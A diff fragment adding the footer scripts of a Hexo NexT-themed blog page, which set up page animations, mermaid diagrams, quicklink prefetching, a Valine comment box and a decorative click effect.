+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script data-pjax>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+    <div id="pjax">
+  
+
+  
+  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
+  <script>
+      window.addEventListener('load', () => {
+      quicklink({
+        timeout : 3000,
+        priority: true,
+        ignores : [uri => uri.includes('#'),uri => uri === 'http://0w0.host/2020/08/09/sqli-lab-Less-1-Less-10/',]
+      });
+      });
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'vJBnfwjYMHBKxnV7r9DoXgRv-gzGzoHsz',
+      appKey     : 'QLEYMJRbky2OyJQ3zBaoPBMF',
+      placeholder: "说些什么？",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '50' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+<!--/*  
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+*/
+-->
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
